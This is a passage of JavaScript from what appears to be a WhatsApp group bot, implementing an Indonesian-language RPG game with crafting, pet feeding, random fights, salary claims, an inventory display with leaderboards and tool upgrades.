if (!m.isGroup) return Xgroup()
let type = (args[0] || '').toLowerCase()
let _type = (args[0] || '').toLowerCase()
let user = db.data.users[m.sender]
let { stock } = db.data.settings[botNumber]

let caption = `
█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█
█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█
█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█

Gunakan Format *${command} [type]*
contoh *${command} pickaxe*

*乂 List Yang Bisa Di Craft*
*乂 Pickaxe ⛏️
*乂 Sword ⚔️
*乂 Fishingrod 🎣
*乂 Armor 🥼
*乂 Atm 💳

*乂 Recipe*
*乂 Pickaxe ⛏️
〉 10 Kayu
〉 5 Batu
〉 5 Iron
〉 20 String

*乂 Sword ⚔️
〉 10 Kayu
〉 15 Iron

*乂 Fishingrod 🎣
〉 10 Kayu
〉 2 Iron
〉 20 String

*乂 Armor 🥼
〉 30 Iron
〉 1 Emerald
〉 5 Diamond

*乂 Atm 💳
〉3 Emerald
〉6 Diamond
〉10k Money
`
try {
if (/craft|Crafting/i.test(command)) {
const count = args[1] && args[1].length > 0 ? Math.min(99999999, Math.max(parseInt(args[1]), 1)) : !args[1] || args.length < 3 ? 1 : Math.min(1, count)
switch (type) {
case 'pickaxe':
if (user.pickaxe > 0) return ReplyRynzz('Kamu sudah memilik ini')
if(user.rock < 5 || user.wood < 10 || user.iron < 5 || user.string < 20) return ReplyRynzz(`Barang tidak cukup!\nUntuk membuat pickaxe. Kamu memerlukan : ${user.wood < 10 ? `\n${10 - user.wood} kayu🪵` : ''} ${user.iron < 5 ? `\n${5 - user.iron} iron⛓` : ''}${user.string < 20 ? `\n${20 - user.string} String🕸️` : ''}${user.rock < 5 ? `\n${5 - user.rock} Batu 🪨` : ''}`)
user.wood -= 10
stock.wood += 10

user.iron -= 5
stock.iron += 5

user.rock -= 5
stock.rock += 5

user.string -= 20
stock.string += 20

user.pickaxe += 1
user.pickaxedurability = 40
ReplyRynzz("Sukses membuat 1 pickaxe 🔨")
break

case 'sword':
if (user.sword > 0) return ReplyRynzz('Kamu sudah memilik ini')
if(user.wood < 10 || user.iron < 15) return ReplyRynzz(`Barang tidak cukup!\nUntuk membuat sword. Kamu memerlukan :${user.wood < 10 ? `\n${10 - user.wood} kayu🪵` : ''}${user.iron < 15 ? `\n${15 - user.iron} iron⛓️` : ''}`)
user.wood -= 10
stock.wood += 10

user.iron -= 15
stock.iron += 15

user.sword += 1
user.sworddurability = 40
ReplyRynzz("Sukses membuat 1 sword 🗡️")
break

case 'fishingrod':
if (user.fishingrod > 0) return ReplyRynzz('Kamu sudah memilik ini')
if(user.wood < 20 || user.iron < 5 || user.string < 20) return ReplyRynzz(`Barang tidak cukup!\nUntuk membuat pancingan. Kamu memerlukan :${user.wood < 20 ? `\n${20 - user.wood} kayu🪵` : ''}${user.iron < 5 ? `\n${5 - user.iron} iron⛓` : ''}${user.string < 20 ? `\n${20 - user.string} String🕸️` : ''}`)
user.wood -= 10
stock.wood += 10

user.iron -= 2
stock.iron +=2

user.string -= 20
stock.string += 20

user.fishingrod += 1
user.fishingroddurability = 40
ReplyRynzz("Sukses membuat 1 Pancingan 🎣")
break

case 'armor':
if (user.armor > 0) return ReplyRynzz('Kamu sudah memilik ini')
if(user.iron < 30 || user.emerald < 1 || user.diamond < 5) return ReplyRynzz(`Barang tidak cukup!\nUntuk membuat armor. Kamu memerlukan :${user.iron < 30 ? `\n${30 - user.iron} Iron ⛓️` : ''}${user.emerald < 1 ? `\n${1 - user.emerald} Emerald ❇️` : ''}${user.diamond < 5 ? `\n${5 - user.diamond} Diamond 💎` : ''}`)
user.emerald -= 1
stock.emerald += 1

user.iron -= 30
stock.iron += 30

user.diamond -= 5
stock.diamond += 5

user.armor += 1
user.armordurability = 50
ReplyRynzz("Sukses membuat 1 Armor 🥼")
break

case 'atm':
if (user.atm > 0) return ReplyRynzz('Kamu sudah memilik ini')
if(user.emerald < 3 || user.money < 10000 || user.diamond < 6) return ReplyRynzz(`Barang tidak cukup!\nUntuk membuat atm. Kamu memerlukan :${user.money < 10000 ? `\n${10000 - user.money} Money 💹` : ''}${user.emerald < 3 ? `\n${3 - user.emerald} Emerald ❇️` : ''}${user.diamond < 6 ? `\n${6 - user.diamond} Diamond 💎` : ''}`)
user.emerald -= 3
stock.emerald += 3

user.diamond -= 6
stock.diamond += 6

user.money -= 10000
user.atm += 1
user.fullatm = 500000000
ReplyRynzz("Sukses membuat 1 Atm 💳")
break
default:
return await ReplyRynzz(`${caption}`)
}
} 
} catch (err) {
ReplyRynzz("Error\n\n\n" + err.stack)
}
}
break

case 'feed': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!m.isGroup) return Xgroup()
function clockString(ms) {
let h = isNaN(ms) ? '--' : Math.floor(ms / 310000)
let m = isNaN(ms) ? '--' : Math.floor(ms / 60000) % 60
let s = isNaN(ms) ? '--' : Math.floor(ms / 1000) % 60
return [h, ' H ', m, ' M ', s, ' S'].map(v => v.toString().padStart(2, 0)).join('')
}

let info = `
乂 List Pet:
🐈 • Cᴀᴛ
🐕 • Dᴏɢ
🐎 • Hᴏʀsᴇ
🦊 • Fᴏx
🤖 • Rᴏʙᴏ

*➠ Example:* ${command}fcat
`.trim()
let pesan = pickRandom(['ɴʏᴜᴍᴍᴍ~', 'ᴛʜᴀɴᴋs', 'ᴛʜᴀɴᴋʏᴏᴜ ^-^', '...', 'ᴛʜᴀɴᴋ ʏᴏᴜ~', 'ᴀʀɪɢᴀᴛᴏᴜ ^-^'])
let type = (args[0] || '').toLowerCase()
let emo = (type == 'fox' ? '🦊':'' || type == 'cat' ? '🐈':'' || type == 'dog' ? '🐕':'' || type == 'horse' ? '🐴':'' || type == 'robo'? '🤖':'' ) 
let user = db.data.users[m.sender]
let rubah = db.data.users[m.sender].fox
let kuda = db.data.users[m.sender].horse
let kucing = db.data.users[m.sender].cat
let anjing = db.data.users[m.sender].dog
let robot = db.data.users[m.sender].robo
switch (type) {
case 'fox':
if (rubah == 0) return ReplyRynzz('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
if (rubah == 10) return ReplyRynzz('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
let __waktur = (new Date - user.foxlastfeed)
let _waktur = (10000 - __waktur)
let waktur = clockString(_waktur)
if (new Date - user.foxlastfeed > 10000) {
if (user.petfood > 0) {
user.petfood -= 1
user.foxexp += 20
user.foxlastfeed = new Date * 1
ReplyRynzz(`ғᴇᴇᴅɪɴɢ *${type}*...\n*${emo} ${type.capitalize()}:* ${pesan}`)
if (rubah > 0) {
let naiklvl = ((rubah * 100) - 1)
if (user.foxexp > naiklvl) {
user.fox += 1
user.foxexp -= (rubah * 100)
ReplyRynzz(`*ᴄᴏɴɢʀᴀᴛs!* , ʏᴏᴜʀ ᴘᴇᴛ ʟᴇᴠᴇʟᴜᴘ`)
}
}
} else ReplyRynzz(`ʏᴏᴜʀ ᴘᴇᴛ ғᴏᴏᴅ ɴᴏᴛ ᴇɴᴏᴜɢʜ`)
} else ReplyRynzz(`ʏᴏᴜʀ ᴘᴇᴛ ɪs ғᴜʟʟ, ᴛʀʏ ғᴇᴇᴅɪɴɢ ɪᴛ ᴀɢᴀɪɴ ɪɴ\n➞ *${waktur}*`)
break

case 'cat':
if (kucing == 0) return ReplyRynzz('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
if (kucing == 10) return ReplyRynzz('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
let __waktuc = (new Date - user.catlastfeed)
let _waktuc = (10000 - __waktuc)
let waktuc = clockString(_waktuc)
if (new Date - user.catlastfeed > 10000) {
if (user.petfood > 0) {
user.petfood -= 1
user.catexp += 20
user.catlastfeed = new Date * 1
ReplyRynzz(`ғᴇᴇᴅɪɴɢ *${type}*...\n*${emo} ${type.capitalize()}:* ${pesan}`)

if (kucing > 0) {
let naiklvl = ((kucing * 100) - 1)
if (user.catexp > naiklvl) {
user.cat += 1
user.catexp -= (kucing * 100)
ReplyRynzz(`*ᴄᴏɴɢʀᴀᴛs!* , ʏᴏᴜʀ ᴘᴇᴛ ʟᴇᴠᴇʟᴜᴘ`)
}
}
} else ReplyRynzz(`ʏᴏᴜʀ ᴘᴇᴛ ғᴏᴏᴅ ɴᴏᴛ ᴇɴᴏᴜɢʜ`)
} else ReplyRynzz(`ʏᴏᴜʀ ᴘᴇᴛ ɪs ғᴜʟʟ, ᴛʀʏ ғᴇᴇᴅɪɴɢ ɪᴛ ᴀɢᴀɪɴ ɪɴ\n➞ *${waktuc}*`)
break

case 'dog':
if (anjing == 0) return ReplyRynzz('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
if (anjing == 10) return ReplyRynzz('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
let __waktua = (new Date - user.doglastfeed)
let _waktua = (10000 - __waktua)
let waktua = clockString(_waktua)
if (new Date - user.doglastfeed > 10000) {
if (user.petfood > 0) {
user.petfood -= 1
user.dogexp += 20
user.doglastfeed = new Date * 1
ReplyRynzz(`ғᴇᴇᴅɪɴɢ *${type}*...\n*${emo} ${type.capitalize()}:* ${pesan}`)
if (anjing > 0) {
let naiklvl = ((anjing * 100) - 1)
if (user.dogexp > naiklvl) {
user.dog += 1
user.dogexp -= (anjing * 100)
ReplyRynzz(`*ᴄᴏɴɢʀᴀᴛs!* , ʏᴏᴜʀ ᴘᴇᴛ ʟᴇᴠᴇʟᴜᴘ`)
}
}
} else ReplyRynzz(`ʏᴏᴜʀ ᴘᴇᴛ ғᴏᴏᴅ ɴᴏᴛ ᴇɴᴏᴜɢʜ`)
} else ReplyRynzz(`ʏᴏᴜʀ ᴘᴇᴛ ɪs ғᴜʟʟ, ᴛʀʏ ғᴇᴇᴅɪɴɢ ɪᴛ ᴀɢᴀɪɴ ɪɴ\n➞ *${waktua}*`)
break

case 'horse':
if (kuda == 0) return ReplyRynzz('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
if (kuda == 10) return ReplyRynzz('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
let __waktuk = (new Date - user.horselastfeed)
let _waktuk = (10000 - __waktuk)
let waktuk = clockString(_waktuk)
if (new Date - user.horselastfeed > 10000) {
if (user.petfood > 0) {
user.petfood -= 1
user.horseexp += 20
user.horselastfeed = new Date * 1
ReplyRynzz(`ғᴇᴇᴅɪɴɢ *${type}*...\n*${emo} ${type.capitalize()}:* ${pesan}`)
if (kuda > 0) {
let naiklvl = ((kuda * 100) - 1)
if (user.horseexp > naiklvl) {
user.horse += 1
user.horseexp -= (kuda * 100)
ReplyRynzz(`*ᴄᴏɴɢʀᴀᴛs!* , ʏᴏᴜʀ ᴘᴇᴛ ʟᴇᴠᴇʟᴜᴘ`)
}
}
} else ReplyRynzz(`ʏᴏᴜʀ ᴘᴇᴛ ғᴏᴏᴅ ɴᴏᴛ ᴇɴᴏᴜɢʜ`)
} else ReplyRynzz(`ʏᴏᴜʀ ᴘᴇᴛ ɪs ғᴜʟʟ, ᴛʀʏ ғᴇᴇᴅɪɴɢ ɪᴛ ᴀɢᴀɪɴ ɪɴ\n➞ *${waktuk}*`)
break

case 'robo':
if (robot == 0) return ReplyRynzz('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
if (robot == 10) return ReplyRynzz('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
let __wakturb = (new Date - user.robolastfeed)
let _wakturb = (10000 - __wakturb)
let wakturb = clockString(_wakturb)
if (new Date - user.robolastfeed > 10000) {
if (user.petfood > 0) {
user.petfood -= 1
user.roboexp += 20
user.robolastfeed = new Date * 1
ReplyRynzz(`ғᴇᴇᴅɪɴɢ *${type}*...\n*${emo} ${type.capitalize()}:* ${pesan}`)
if (robot > 0) {
let naiklvl = ((robot * 100) - 1)
if (user.roboexp > naiklvl) {
user.robo += 1
user.roboexp -= (robot * 100)
ReplyRynzz(`*ᴄᴏɴɢʀᴀᴛs!* , ʏᴏᴜʀ ᴘᴇᴛ ʟᴇᴠᴇʟᴜᴘ`)
}
}
} else ReplyRynzz(`ʏᴏᴜʀ ᴘᴇᴛ ғᴏᴏᴅ ɴᴏᴛ ᴇɴᴏᴜɢʜ`)
} else ReplyRynzz(`ʏᴏᴜʀ ᴘᴇᴛ ɪs ғᴜʟʟ, ᴛʀʏ ғᴇᴇᴅɪɴɢ ɪᴛ ᴀɢᴀɪɴ ɪɴ\n➞ *${wakturb}*`)
break
default:
return ReplyRynzz(`${info}`)
}
}
break

case 'fighting':
 case 'fight': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
 if (!m.isGroup) return Xgroup()
Alice.fight = Alice.fight ? Alice.fight: {}
let user = db.data.users[m.sender]
if (typeof Alice.fight[m.sender] != "undefined" && Alice.fight[m.sender] == true) return ReplyRynzz(`Kamu masih bertarung.`)
let users = participants.map(a => a.id)
var lawan
lawan = users[Math.floor(users.length * Math.random())]
while (typeof db.data.users[lawan] == "undefined" || lawan == m.sender) {
lawan = users[Math.floor(users.length * Math.random())]
}
ReplyRynzz(`*Kamu* (level ${user.level}) menantang *${Alice.getName(lawan)}* (level ${db.data.users[lawan].level}) dan sedang dalam pertarungan.\n\nTunggu 5 menit lagi dan lihat siapa yg menang.`)
Alice.fight[m.sender] = true
await delay(300000)
let kesempatan = []
for (let i = 0; i < user.level; i++) kesempatan.push(m.sender)
for (let i = 0; i < db.data.users[lawan].level; i++) kesempatan.push(lawan)
let pointPemain = 0
let pointLawan = 0
for (let i = 0; i < 10; i++) {
let unggul = getRandom(0, kesempatan.length - 1)
if (kesempatan[unggul] == m.sender) pointPemain += 1
else pointLawan += 1
}
if (pointPemain > pointLawan) {
let hadiah = (pointPemain - pointLawan) * 10000
user.money += hadiah
user.limit += 1
ReplyRynzz(`*${Alice.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${Alice.getName(lawan)}*\n\n*Kamu* (level ${user.level}) menang melawan *${Alice.getName(lawan)}* (level ${db.data.users[lawan].level}) karena kamu ${alasanMenang[getRandom(0, alasanMenang.length - 1)]}\n\nHadiah . ${hadiah.toLocaleString()}\n+1 Limit`)
} else if (pointPemain < pointLawan) {
let denda = (pointLawan - pointPemain) * 100000
user.money -= denda
user.limit += 1
ReplyRynzz(`*${Alice.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${Alice.getName(lawan)}*\n\n*Kamu* (level ${user.level}) kalah melawan *${Alice.getName(lawan)}* (level ${db.data.users[lawan].level}) karena kamu ${alasanKalah[getRandom(0, alasanKalah.length - 1)]}\n\nMoney kamu berkurang ${denda.toLocaleString()}\n+1 Limit`)
} else {
ReplyRynzz(`*${Alice.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${Alice.getName(lawan)}*\n\nHasil imbang kak, ga dapet apa apa`)
}
delete Alice.fight[m.sender]
}
break

case 'gajian': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!m.isGroup) return Xgroup()
function JaM(ms) {
let h = isNaN(ms) ? '60' : Math.floor(ms / 3600000) % 60
return [h].map(v => v.toString().padStart(2, 0) ).join(':')
}

function MeNit(ms) {
let m = isNaN(ms) ? '60' : Math.floor(ms / 60000) % 60
return [m].map(v => v.toString().padStart(2, 0) ).join(':')
}

function DeTik(ms) {
let s = isNaN(ms) ? '60' : Math.floor(ms / 1000) % 60
return [s].map(v => v.toString().padStart(2, 0) ).join(':')
}

let LastClaim = db.data.users[m.sender].lastclaim
let cdm = `${MeNit(new Date - LastClaim)}`
let cds = `${DeTik(new Date - LastClaim)}`
let cd1 = Math.ceil(44 - cdm)
let cd2 = Math.ceil(59 - cds)
if (new Date - db.data.users[m.sender].lastclaim > 2700000) {
db.data.users[m.sender].money += 50000
db.data.users[m.sender].exp += 100
ReplyRynzz('Nih gaji lu +Rp50000')
db.data.users[m.sender].lastclaim = new Date * 1
} else return ReplyRynzz(`Lu udah ambil jatah hari ini.\n\nTunggu ${cd1} Menit ${cd2} Detik!`)
}
break      

case 'me':
case 'inventory': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!m.isGroup) return Xgroup()
let inventory = {
others: {
joinlimit: true,
health: true,
money: true,
chip: true,
exp: true,
},
items: {
bibitanggur: true,
bibitmangga: true,
bibitpisang: true,
bibitapel: true,
bibitjeruk: true,
anggur: true,
mangga: true,
pisang: true,
apel: true,
jeruk: true,
potion: true,
trash: true,
wood: true,
rock: true,
string: true,
emerald: true,
diamond: true,
gold: true,
iron: true,
umpan: true,
upgrader: true,
pet: true,
petfood: true,
},
durabi: {
sworddurability: true,
pickaxedurability: true,
fishingroddurability: true,
armordurability: true,
},
tools: {
armor: {
'0': '❌',
'1': 'Leather Armor',
'2': 'Iron Armor',
'3': 'Gold Armor',
'4': 'Diamond Armor',
'5': 'Emerald Armor',
'6': 'Crystal Armor',
'7': 'Obsidian Armor',
'8': 'Netherite Armor',
'9': 'Wither Armor',
'10': 'Dragon Armor',
'11': 'Hacker Armor'
},
sword: {
'0': '❌',
'1': 'Wooden Sword',
'2': 'Stone Sword',
'3': 'Iron Sword',
'4': 'Gold Sword',
'5': 'Copper Sword',
'6': 'Diamond Sword',
'7': 'Emerald Sword',
'8': 'Obsidian Sword',
'9': 'Netherite Sword',
'10': 'Samurai Slayer Green Sword',
'11': 'Hacker Sword'
},
pickaxe: {
'0': '❌',
'1': 'Wooden Pickaxe',
'2': 'Stone Pickaxe',
'3': 'Iron Pickaxe',
'4': 'Gold Pickaxe',
'5': 'Copper Pickaxe',
'6': 'Diamond Pickaxe',
'7': 'Emerlad Pickaxe',
'8': 'Crystal Pickaxe',
'9': 'Obsidian Pickaxe',
'10': 'Netherite Pickaxe',
'11': 'Hacker Pickaxe'
},
fishingrod: {
'0': '❌',
'1': 'Wooden Fishingrod',
'2': 'Stone Fishingrod',
'3': 'Iron Fishingrod',
'4': 'Gold Fishingrod',
'5': 'Copper Fishingrod',
'6': 'Diamond Fishingrod',
'7': 'Emerald Fishingrod',
'8': 'Crystal Fishingrod',
'9': 'Obsidian Fishingrod',
'10': 'God Fishingrod',
'11': 'Hacker Fishingrod'
 }
},
crates: {
common: true,
uncommon: true,
mythic: true,
legendary: true,
},
pets: {
horse: 10,
cat: 10,
fox: 10,
dog: 10,
robo: 10,
},
cooldowns: {}
}

let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? Alice.user.jid : m.sender
let user = db.data.users[who]

if (!(who in db.data.users)) return ReplyRynzz(`User ${who} not in database`)

let sortedlevel = Object.entries(db.data.users).sort((a, b) => b[1].level - a[1].level)
let userslevel = sortedlevel.map(v => v[0])
let sortedchip = Object.entries(db.data.users).sort((a, b) => b[1].chip - a[1].chip)
let userschip = sortedchip.map(v => v[0])
let sortedmoney = Object.entries(db.data.users).sort((a, b) => b[1].money - a[1].money)
let usersmoney = sortedmoney.map(v => v[0])
let sorteddiamond = Object.entries(db.data.users).sort((a, b) => b[1].diamond - a[1].diamond)
let usersdiamond = sorteddiamond.map(v => v[0])
let sortedbank = Object.entries(db.data.users).sort((a, b) => b[1].bank - a[1].bank)
let usersbank = sortedbank.map(v => v[0])
let sortedgold = Object.entries(db.data.users).sort((a, b) => b[1].gold - a[1].gold)
let usersgold = sortedgold.map(v => v[0])

let isMods = [Alice.decodeJid(Alice.user.id), ...global.owner.filter(([number, _, isOwner]) => number && isOwner).map(([number]) => number)].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(who)
let isOwner = m.fromMe || isMods || [Alice.decodeJid(Alice.user.id), ...global.owner.filter(([number, _, isOwner]) => number && !isOwner).map(([number]) => number)].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(who)
let isPrems = isOwner || new Date() - user.premiumTime < 0

let limit = isPrems ? 'Unlimited' : user.limit
let tools = Object.keys(inventory.tools).map(v => user[v] && `*${global.rpg.emoticon(v)} ${v}:* ${typeof inventory.tools[v] === 'object' ? inventory.tools[v][user[v]?.toString()] : `Level(s) ${user[v]}`}`).filter(v => v).join('\n').trim()
let items = Object.keys(inventory.items).map(v => user[v] && `*${global.rpg.emoticon(v)} ${v}:* ${user[v]}`).filter(v => v).join('\n').trim()
let dura = Object.keys(inventory.durabi).map(v => user[v] && `*${global.rpg.emoticon(v)} ${v}:* ${user[v]}`).filter(v => v).join('\n').trim()
let crates = Object.keys(inventory.crates).map(v => user[v] && `*${global.rpg.emoticon(v)} ${v}:* ${user[v]}`).filter(v => v).join('\n').trim()
let pets = Object.keys(inventory.pets).map(v => user[v] && `*${global.rpg.emoticon(v)} ${v}:* ${user[v] >= inventory.pets[v] ? 'Max Levels' : `Level(s) ${user[v]}`}`).filter(v => v).join('\n').trim()
let cooldowns = Object.entries(inventory.cooldowns).map(([cd, { name, time }]) => cd in user && `*✧ ${name}*: ${new Date() - user[cd] >= time ? '✅' : '❌'}`).filter(v => v).join('\n').trim()

let caption = `
🧑🏻‍🏫 ᴜsᴇʀ: *${user.registered ? user.name : Alice.getName(who)}* ${user.level ? `
➠ ${global.rpg.emoticon('level')} level: ${user.level}` : ''} ${user.limit ? `
➠ ${global.rpg.emoticon('limit')} limit: ${limit}` : ''}
${Object.keys(inventory.others).map(v => user[v] && `➠ ${global.rpg.emoticon(v)} ${v}: ${user[v]}`).filter(v => v).join('\n')} ${tools ? `

*ʟɪꜱᴛ ᴛᴏᴏʟs* :
${tools}` : ''}${items ? `

*ʟɪꜱᴛ ɪᴛᴇᴍs* :
${items}` : ''}${crates ? `

*ʟɪꜱᴛ ᴄʀᴀᴛᴇs* :
${crates}` : ''}${pets ? `

*ʟɪꜱᴛ ᴩᴇᴛs* :
${pets}` : ''}${cooldowns ? `

*ʟɪꜱᴛ ᴀʀᴄʜɪᴇᴠᴇᴍᴇɴᴛ* :
${global.rpg.emoticon('chip')} ᴛᴏᴘ ᴄʜɪᴘ *${userschip.indexOf(who) + 1}* ᴅᴀʀɪ *${userschip.length}*
${global.rpg.emoticon('money')} ᴛᴏᴘ ᴍᴏɴᴇʏ *${usersmoney.indexOf(who) + 1}* ᴅᴀʀɪ *${usersmoney.length}*
${global.rpg.emoticon('bank')} ᴛᴏᴘ ʙᴀɴᴋ *${usersbank.indexOf(who) + 1}* ᴅᴀʀɪ *${usersbank.length}*
${global.rpg.emoticon('level')} ᴛᴏᴘ ʟᴇᴠᴇʟ *${userslevel.indexOf(who) + 1}* ᴅᴀʀɪ *${userslevel.length}*
${global.rpg.emoticon('diamond')} ᴛᴏᴘ ᴅɪᴀᴍᴏɴᴅ *${usersdiamond.indexOf(who) + 1}* ᴅᴀʀɪ *${usersdiamond.length}*
${global.rpg.emoticon('gold')} ᴛᴏᴘ ɢᴏʟᴅ *${usersgold.indexOf(who) + 1}* ᴅᴀʀɪ *${usersgold.length}*

♻️ *ᴄᴏʟʟᴇᴄᴛ ʀᴇᴡᴀʀᴅs* :
${cooldowns}` : ''}
*✧ dungeon: ${user.lastdungeon == 0 ? '✅': '❌'}*
*✧ mining: ${user.lastmining == 0 ? '✅': '❌'}*
*✧ daily: ${user.lastclaimday == 0 ? '✅': '❌'}*
*✧ monthly: ${user.lastclaimwek == 0 ? '✅': '❌'}*
*✧ yearly: ${user.lastclaimyer == 0 ? '✅': '❌'}*
`.trim()

ReplyRynzz(`${caption}`)
}
break

case 'upgrade': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!m.isGroup) return Xgroup()
let user = db.data.users[m.sender]
let wood = user.wood * 1
let rock = user.rock * 1
let string = user.string * 1
let money = user.money * 1
let iron = user.iron * 1
let fishingrod = user.fishingrod * 1
let pickaxe = user.pickaxe * 1
let sword = user.sword * 1
let diamond = user.diamond * 1
let emerald = user.emerald * 1
let armor = user.armor * 1
let atm = user.atm
let type = (args[0] || '').toLowerCase()
let prefix = command

let teks = `█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█
█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█
█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█

Gunakan Format *${command} [type]*
contoh *${command} fishingRod*

*📌List yang Bisa Di Upgrade*
${rpg.emoticon('fishingrod')}FishingRod
${rpg.emoticon('pickaxe')}Pickaxe
${rpg.emoticon('sword')}Sword
${rpg.emoticon('armor')}Armor
${rpg.emoticon('atm')}Atm
`.trim()

switch (type) {
case 'fishingrod':
if (fishingrod == 0) {
let lmao = `anda belum memiliki *🎣FishingRod*
untuk mendapatkannya ketik *${command}craft fishingrod*`
return ReplyRynzz(`${lmao}`)
}
if (fishingrod > 9) return ReplyRynzz(`*${rpg.emoticon('fishingrod')}FishingRod* kamu sudah level max`)
let _wood = fishingrod * 100
let _string = fishingrod * 100
let _money = fishingrod * 1000000
if (wood < _wood || string < _string || money < _money) return ReplyRynzz(`Material kamu kurang!!${wood < _wood ? `\n${rpg.emoticon('wood')}wood Kamu Kurang *${_wood - wood}*` : ''}${string < _string ? `\n${rpg.emoticon('string')}String Kamu Kurang *${_string - string}*` : ''}${user.money < _money ? `\n${rpg.emoticon('money')}Uang Kamu Kurang *${_money - money}*` : ''}`)
user.fishingrod += 1
user.wood -= _wood * 1
user.string -= _string * 1
user.money -= _money * 1
user.fishingroddurability = 0 
user.fishingroddurability += fishingrod * 50
ReplyRynzz(`Succes mengupgrade *${rpg.emoticon('fishingrod')}FishingRod*`)
break

case 'pickaxe':
if (pickaxe == 0) {
let lmao = `anda belum memiliki *${rpg.emoticon('pickaxe')}Pickaxe*
untuk memilikinya ketik *${command}craft Pickaxe*`
return ReplyRynzz(`${lmao}`)
}
if (pickaxe > 9) return ReplyRynzz(`*${rpg.emoticon('pickaxe')}Pickaxe* kamu sudah level max!!`)
let __rock = pickaxe * 250
let __wood = pickaxe * 150
let __money = pickaxe * 1500000
if (rock < __rock || wood < __wood || money < __money) return ReplyRynzz(`
Material Anda Kurang!!
${rock < __rock ? `\n${rpg.emoticon('rock')}rock kamu kurang *${__rock - rock}*` : ''}${wood < __wood ? `\n${rpg.emoticon('wood')}wood kamu kurang *${__wood - wood}*` : ''}${money < __money ? `\n${rpg.emoticon('money')}Uang kamu kurang *${__money - money}*` : ''}`)
user.pickaxe += 1
user.wood -= __wood * 1
user.rock -= __rock * 1
user.money -= __money * 1
user.pickaxedurability = 0
user.pickaxedurability += pickaxe * 50
ReplyRynzz(`Succes mengupgrade *${rpg.emoticon('pickaxe')}Pickaxe*`)
break

case 'sword':
if (sword == 0) {
let lmao = `anda belum memiliki *${rpg.emoticon('sword')}Sword*
untuk memilikinya ketik *${command}craft sword*`
return ReplyRynzz(`${lmao}`)
}
if (sword > 9) return ReplyRynzz(`*${rpg.emoticon('sword')}Sword* kamu sudah level max!!`)
let _iron = sword * 250
let ___wood = sword * 150
let ___money = sword * 1000000
if (iron < _iron || wood < ___wood || money < ___money) return ReplyRynzz(`
Material Anda Kurang!!
${iron < _iron ? `\n${rpg.emoticon('iron')}Iron kamu kurang *${_iron - iron}*` : ''}${wood < ___wood ? `\n${rpg.emoticon('wood')}wood kamu kurang *${___wood - wood}*` : ''}${money < ___money ? `\n${rpg.emoticon('money')}Uang kamu kurang *${___money - money}*` : ''}`)
user.sword += 1
user.iron -= _iron * 1
user.wood -= ___wood * 1
user.money -= ___money * 1
user.sworddurability = 0 
user.sworddurability += sword * 50 
ReplyRynzz(`Succes mengupgrade *${rpg.emoticon('sword')}Sword*`)
break

case 'armor':
if (armor == 0) {
let lmao = `anda belum memiliki *${rpg.emoticon('armor')}Armor*
untuk memilikinya ketik *${command}craft armor*`
return ReplyRynzz(`${lmao}`)
}
if (armor > 9) return ReplyRynzz(`*${rpg.emoticon('armor')}Armor* kamu sudah level max!!`)
let _diamond = armor * 5
let ____wood = armor * 150
let ____money = armor * 1000000
if (diamond < _diamond || wood < ____wood || money < ____money) return ReplyRynzz(`
